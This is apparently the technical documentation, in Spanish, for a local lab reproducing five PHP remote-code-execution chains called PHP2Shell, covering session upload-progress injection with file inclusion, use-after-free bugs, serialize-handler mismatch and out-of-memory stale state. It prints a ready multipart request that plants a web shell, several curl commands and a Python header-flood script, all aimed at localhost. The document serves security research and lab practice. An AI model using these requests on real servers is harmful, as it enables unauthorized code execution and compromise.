# Cadenas de ataque PHP2Shell — Detalle técnico

Este documento describe las **cinco cadenas de ataque** (A, B, C, D, E) documentadas en la investigación PHP2Shell, con foco en las tres reproducibles en este lab.

---

## Chain A — Session File Injection + LFI → RCE

**Precondiciones:**
- `session.upload_progress.enabled = On` (default)
- `session.upload_progress.cleanup = Off` (el lab lo tiene Off; el default de PHP es On)
- `session.use_strict_mode = Off` (default)
- **Aplicación con LFI** (local file inclusion)

**Superficie:** PHP-FPM o Apache mod_php.

**Mecánica del ataque:**

1. **Session fixation:** como `use_only_cookies=0` (default), el `PHPSESSID` se puede fijar enviándolo en el **cuerpo multipart** además de en la cookie:
   ```
   Content-Disposition: form-data; name="PHPSESSID"
   
   ctfchainA000000000000000000
   ```

2. **Disparar el handler `upload_progress`:** la petición multipart debe incluir:
   - Un campo con `name="PHP_SESSION_UPLOAD_PROGRESS"` (el `session.upload_progress.name` por defecto) con cualquier valor (ej. `x`).
   - Un campo tipo `file` con `filename="<payload>"`. El **filename** es lo que se escribe CRUDO en el fichero de sesión.

3. **Inyección del payload PHP en el filename:**
   ```
   Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"
   ```
   Como `cleanup=Off`, el fichero `sess_<SID>` persiste tras la petición con el código PHP dentro (sin sanitizar).

4. **LFI → ejecución:** el endpoint vulnerable de LFI (`vuln.php?page=...`) hace `include($_GET['page'])` sin sanitizar. Incluye el fichero de sesión:
   ```
   GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
   ```
   Al incluirse, el código PHP del filename se ejecuta.

**Ejemplo de petición completa (Chain A):**

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: multipart/form-data; boundary=EXPLOIT
Cookie: PHPSESSID=ctfchainA000000000000000000

--EXPLOIT
Content-Disposition: form-data; name="PHPSESSID"

ctfchainA000000000000000000
--EXPLOIT
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--EXPLOIT
Content-Disposition: form-data; name="f"; filename="<?php system($_GET['c']); ?>"

dummy
--EXPLOIT--
```

Luego:
```http
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
```

**Fiabilidad:** 100% si la app tiene LFI.

---

## Chain B — `var_destroy` UAF → Handler Overwrite → RCE

**Precondiciones:**
- Aplicación llama `unserialize()` con data controlada.
- Gadget destructor disponible (clase con `__destruct`).

**Superficie:** cualquier SAPI (FPM, mod_php, CLI).

**Mecánica del ataque:**

`var_destroy()` libera chunks de back-reference y luego dispara `__destruct` **sin** `serialize_lock`. Un `unserialize()` anidado dentro del destructor reutiliza el `var_hash` liberado → **heap-use-after-free** → sobrescritura de function handler → RCE.

**Verificación:** PoC `verify_uaf_asan.php` del repo oficial, ejecutado localmente con PHP compilado con ASAN:
```bash
USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
```

**Este lab NO incluye un endpoint `unserialize()` controlado** porque Chain B es más demo de gadget que de superficie web. Se puede añadir manualmente si se desea probar.

**Confirmación ASAN:** `heap-use-after-free` en `var_unserializer.c:851`.

---

## Chain C — Session Handler Mismatch → `__destruct` → RCE

**Precondiciones:**
- Dos directorios con diferentes `session.serialize_handler`:
  - Directorio escritura: `php_serialize` (preserva pipe `|` en strings).
  - Directorio lectura: `php` (interpreta `|` como separador de campos).
- Save path compartido (`session.save_path` apunta al mismo directorio).

**Superficie:** PHP-FPM con soporte `.user.ini` (el PHP built-in server NO soporta `.user.ini`; este lab usa nginx → php-fpm).

**Mecánica del ataque:**

1. **Escritura con `php_serialize`:** POST a `/app/upload.php` (que tiene `.user.ini` con `session.serialize_handler = php_serialize`). El filename con pipe y objeto serializado se escribe tal cual:
   ```
   filename="x|O:8:\"stdClass\":0:{}"
   ```
   Fichero sesión resultante (serializado con `php_serialize`):
   ```
   a:1:{s:10:"upload_progress_x";a:5:{...s:4:"name";s:22:"x|O:8:\"stdClass\":0:{}"...}}
   ```

2. **Lectura con `php`:** GET/POST a `/api/endpoint.php` (que tiene `.user.ini` con `session.serialize_handler = php`). Al deserializar, el handler `php` **split** en el primer `|` → trata `O:8:\"stdClass\":0:{}` como un objeto serializado → instancia `stdClass` → dispara `__destruct` durante cleanup del `var_hash` **incluso cuando el decode retorna FAILURE**.

**Hallazgo clave de la investigación:** `__destruct` se dispara en **ambos** paths (success y failure) durante la limpieza del var_hash tras el parse.

**Ejemplo de petición (Chain C):**

```bash
# Escritura (php_serialize)
curl -X POST \
  -H "Cookie: PHPSESSID=chainC00000000000000000000" \
  -F "PHPSESSID=chainC00000000000000000000" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' \
  http://127.0.0.1:18080/app/upload.php <<< "dummy"

# Lectura (php handler deserializa y dispara __destruct)
curl -H "Cookie: PHPSESSID=chainC00000000000000000000" \
  http://127.0.0.1:18080/api/endpoint.php
```

**Verificación:** inspeccionar logs de PHP buscando warnings de decode failure (si `display_errors=On`), o rastrear `__destruct` con un gadget real.

---

## Chain D — mod_php OOM → Stale `EG()` → RCE ⚡

**Precondiciones:** **NINGUNA** (0-day sin dependencias de app).

**Superficie:** **Apache mod_php exclusivamente** (no FPM, no CLI).

**Severidad crítica:** RCE pre-autenticación contra **cualquier** endpoint PHP en Apache mod_php.

**Mecánica del ataque:**

1. **Disparar OOM durante request startup:** enviar POST con headers masivos o body enorme que dispare `zend_mm` OOM durante `php_request_startup` → `longjmp()` salta el initialization → Apache mod_php **NO mata el proceso** (a diferencia de FPM que mata el worker).

2. **Stale executor globals:** el proceso Apache reutiliza el executor con `EG()` globals corruptos (no inicializados por el `longjmp`). La siguiente request hereda ese estado → UAF en shutdown paths → RCE.

**Estrategias de OOM:**

- **Headers masivos:** enviar miles de headers `X-Custom-N: <padding>` hasta saturar memoria antes del body parse.
- **POST body enorme:** `Content-Length` > `memory_limit` con body que dispare OOM en el parse multipart.

**Ejemplo (headers masivos):**

```python
import socket

def oom_headers(host, port, path):
    sock = socket.create_connection((host, port), timeout=15)
    req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
    # 100k headers de 1KB cada uno → ~100MB
    for i in range(100000):
        req += f"X-Custom-{i}: {'A'*1000}\r\n"
    req += "\r\n"
    sock.sendall(req.encode())
    sock.close()

oom_headers("127.0.0.1", 18081, "/index.php")
```

**SAPI afectados:**
- Apache mod_php ✅ (confirmado)
- FPM ⚠️ (worker exit, no persiste el estado sucio)
- FrankenPHP ✅ (confirmado en la investigación)

**Este lab expone Chain D en `127.0.0.1:18081` (Apache mod_php con `memory_limit=32M`).**

**PoC oficial:** `verify_oom_trigger.py` del repo `ikow/php2shell-poc`.

---

## Chain E — FPM Session OOM → Stale `BG(unserialize)` → RCE ⚡

**Precondiciones:**
- Endpoint con `session_start()` que lea sesión grande (~30MB).
- PHP-FPM (no mod_php).

**Superficie:** PHP-FPM exclusivamente.

**Mecánica del ataque:**

1. **Producer request:** `session_start()` decodifica sesión ~30MB → OOM durante `php_var_unserialize` → `BG(unserialize).level` queda >0, estado de destrucción sucio → FPM worker **sobrevive** (a diferencia del comportamiento de FPM en Chain D, aquí el OOM es durante una fase distinta y el worker no muere).

2. **Consumer request:** disparar `upload_progress` → el handler `rfc1867` (que corre **antes** de `PHP_RINIT_FUNCTION(basic)`) accede al `BG(unserialize)` stale → "Session object destruction failed" → `__destruct` en objetos stale → UAF → RCE.

**Hallazgo clave:** `rfc1867` corre ANTES del `basic_rinit`, así que el `BG(unserialize)` stale es accesible.

**Verificación:** "Session object destruction failed" en logs durante PHP Request Startup.

**PoC oficial:** `verify_fpm_stale_state.py`.

**Este lab expone FPM en `:18080` / `:9000`, pero NO incluye un endpoint con sesión grande pre-poblada.** Se puede crear manualmente si se desea probar Chain E.

---

## Resumen de chains por endpoint del lab

| Chain | Endpoint(s) del lab                  | Reproducible OOTB | Notas                                   |
|-------|--------------------------------------|-------------------|-----------------------------------------|
| A     | `:18080/vuln.php` + `:18080/index.php` | ✅ Sí              | LFI + upload_progress, listo para usar  |
| B     | (ninguno)                            | ❌ No             | Requiere endpoint `unserialize()` + gadget |
| C     | `:18080/app/` y `:18080/api/`        | ✅ Sí              | Handler mismatch vía `.user.ini`        |
| D     | `:18081/index.php` (Apache mod_php)  | ✅ Sí              | OOM mod_php con `memory_limit=32M`      |
| E     | `:18080` (FPM)                       | ⚠️ Parcial        | Requiere sesión grande pre-poblada      |

**Para uso en CTF/pentesting local autorizado.**
